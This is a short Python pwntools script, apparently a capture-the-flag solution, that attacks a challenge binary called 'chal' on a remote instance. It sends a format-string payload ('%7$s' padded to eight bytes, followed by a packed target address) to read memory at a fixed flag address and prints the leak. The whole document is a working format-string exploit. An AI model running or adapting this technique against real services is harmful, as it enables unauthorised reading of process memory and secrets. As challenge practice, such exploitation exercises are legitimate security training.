from pwn import *
from config import REMOTE_ADDR, REMOTE_PORT

REMOTE = 1  # Change to 1 to run the exploit on the remote instance

e = context.binary = ELF("./chal")

if REMOTE:
    p = remote(REMOTE_ADDR, REMOTE_PORT)
else:
    p = e.process()

FLAG_ADDR = 0x04040A0


def send_input(data):
    p.sendafter(b"> ", data)
    res = p.recvline()
    return res


payload = b"%7$s"
payload += b"|" * 4  # pad to 8 bytes
payload += p64(FLAG_ADDR)

res = send_input(payload)
print(res)
